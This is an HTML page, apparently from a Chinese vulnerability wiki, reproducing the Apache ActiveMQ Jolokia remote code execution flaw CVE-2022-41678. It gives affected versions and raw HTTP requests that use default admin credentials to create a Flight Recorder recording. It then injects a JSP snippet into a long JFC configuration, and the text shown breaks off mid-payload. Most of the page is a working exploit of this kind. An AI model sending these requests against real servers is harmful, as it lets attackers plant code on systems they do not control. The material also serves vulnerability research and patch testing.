<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Apache/Apache-ActiveMQ-Jolokia-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2022-41678/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Apache ActiveMQ Jolokia 远程代码执行漏洞 CVE 2022 41678 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Apache-ActiveMQ-Jolokia-\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e-CVE-2022-41678", url: "#_top", children: [
          ]},
          {title: "\u5f71\u54cd\u8303\u56f4", url: "#_1", children: [
          ]},
          {title: "\u6f0f\u6d1e\u590d\u73b0\u7248\u672c\u4e0b\u8f7d", url: "#_2", children: [
          ]},
          {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3", children: [
              {title: "\u65b0\u5efa\u8bb0\u5f55", url: "#_4" },
              {title: "\u5199\u5165payload", url: "#payload" },
              {title: "\u5bfc\u51fa\u5f55\u5236\u5230web\u76ee\u5f55", url: "#web" },
          ]},
          {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_5", children: [
          ]},
          {title: "payload", url: "#payload_1", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Apache-ActiveMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Apache-ActiveMQ%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache ActiveMQ远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Apache%20ZooKeeper%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2014-085/" class="btn btn-xs btn-link">
        Apache ZooKeeper 未授权访问漏洞 CVE-2014-085
      </a>
    </div>
    
  </div>

    

    <h2 id="apache-activemq-jolokia-cve-2022-41678">Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678<a class="headerlink" href="#apache-activemq-jolokia-cve-2022-41678" title="Permanent link">&para;</a></h2>
<h2 id="_1">影响范围<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>Apache ActiveMQ before 5.16.6
Apache ActiveMQ 5.17.0 before 5.17.4
Apache ActiveMQ 5.18.0 unaffected
Apache ActiveMQ 6.0.0 unaffected
</code></pre></div>
<h2 id="_2">漏洞复现版本下载<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>https://activemq.apache.org/activemq-5017000-release
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h4 id="_4">新建记录<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
<p><div class="highlight"><pre><span></span><code>POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 136

{
    &quot;type&quot;: &quot;EXEC&quot;,
    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,
    &quot;operation&quot;: &quot;newRecording&quot;,
    &quot;arguments&quot;: []
}
</code></pre></div>
记住这个 <code>value</code>参数中的值，后面的poc要用到,例如现在是4
<img alt="" src="./assets/20231130233131.png" /></p>
<h4 id="payload">写入payload<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h4>
<p><div class="highlight"><pre><span></span><code>POST /api/jolokia/ HTTP/1.1
Host: localhost:8161
Origin:localhost:8161
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Content-Type: application/json
Content-Length: 136

{
    &quot;type&quot;: &quot;EXEC&quot;,
    &quot;mbean&quot;: &quot;jdk.management.jfr:type=FlightRecorder&quot;,
    &quot;operation&quot;: &quot;setConfiguration&quot;,
    &quot;arguments&quot;: [4,&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;
&lt;!--
     Recommended way to edit .jfc files is to use Java Mission Control,
     see Window -&gt; Flight Recorder Template Manager.
--&gt;
&lt;configuration version=\&quot;2.0\&quot; label=\&quot;Profiling\&quot; description=\&quot;Low overhead configuration for profiling, typically around 2 % overhead.\&quot; provider=\&quot;Oracle\&quot;&gt;
    &lt;event name=\&quot;jdk.ThreadAllocationStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk &amp;lt;%out.printIn(&amp;quot;success&amp;quot;);%&amp;gt;&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ClassLoadingStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;1000 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ClassLoaderStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaThreadStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;1000 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadStart\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadEnd\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadSleep\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;synchronization-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadPark\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;synchronization-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaMonitorEnter\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;synchronization-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaMonitorWait\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;synchronization-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JavaMonitorInflate\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot; control=\&quot;synchronization-threshold\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.BiasedLockRevocation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.BiasedLockSelfRevocation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.BiasedLockClassRevocation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ReservedStackActivation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ClassLoad\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;class-loading-enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ClassDefine\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;class-loading-enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ClassUnload\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;class-loading-enabled\&quot;&gt;false&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.JVMInformation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.InitialSystemProperty\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ExecutionSample\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;method-sampling-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot; control=\&quot;method-sampling-java-interval\&quot;&gt;10 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.NativeMethodSample\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;method-sampling-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot; control=\&quot;method-sampling-native-interval\&quot;&gt;20 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SafepointBegin\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SafepointStateSynchronization\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SafepointWaitBlocked\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SafepointCleanup\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SafepointCleanupTask\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.SafepointEnd\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ExecuteVMOperation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.Shutdown\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ThreadDump\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;thread-dump-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot; control=\&quot;thread-dump-interval\&quot;&gt;60 s&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.IntFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.UnsignedIntFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.LongFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.UnsignedLongFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.DoubleFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.BooleanFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.StringFlag\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.IntFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.UnsignedIntFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.LongFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.UnsignedLongFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.DoubleFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.BooleanFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.StringFlagChanged\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ObjectCount\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;memory-profiling-enabled-all\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCHeapConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.YoungGenerationConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCTLABConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCSurvivorConfiguration\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;beginChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ObjectCountAfterGC\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot;&gt;false&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCHeapSummary\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.PSHeapSummary\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1HeapSummary\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.MetaspaceSummary\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.MetaspaceGCThreshold\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.MetaspaceAllocationFailure\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.MetaspaceOOM\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.MetaspaceChunkFreeListSummary\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GarbageCollection\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ParallelOldGarbageCollection\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.YoungGarbageCollection\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.OldGarbageCollection\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1GarbageCollection\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCPhasePause\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCPhasePauseLevel1\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCPhasePauseLevel2\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCPhasePauseLevel3\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-all\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCPhasePauseLevel4\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-all\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCPhaseConcurrent\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-all\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;threshold\&quot;&gt;0 ms&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.GCReferenceStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.PromotionFailed\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.EvacuationFailed\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.EvacuationInformation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1MMU\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1EvacuationYoungStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1EvacuationOldStatistics\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1BasicIHOP\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1AdaptiveIHOP\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.PromoteObjectInNewPLAB\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;memory-profiling-enabled-medium\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.PromoteObjectOutsidePLAB\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;memory-profiling-enabled-medium\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.ConcurrentModeFailure\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.AllocationRequiringGC\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-all\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.TenuringDistribution\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-normal\&quot;&gt;true&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1HeapRegionInformation\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-all\&quot;&gt;false&lt;/setting&gt;
      &lt;setting name=\&quot;period\&quot;&gt;everyChunk&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.G1HeapRegionTypeChange\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;gc-enabled-all\&quot;&gt;false&lt;/setting&gt;
    &lt;/event&gt;
    &lt;event name=\&quot;jdk.OldObjectSample\&quot;&gt;
      &lt;setting name=\&quot;enabled\&quot; control=\&quot;memory-leak-detection-enabled\&quot;&gt;true&lt;/setting&gt;
      &lt;setting name=\&quot;stackTrace\&quot; control=\&quot;memory-leak-detection-stack-trace\&quot;&gt;true&lt;/setting&gt;
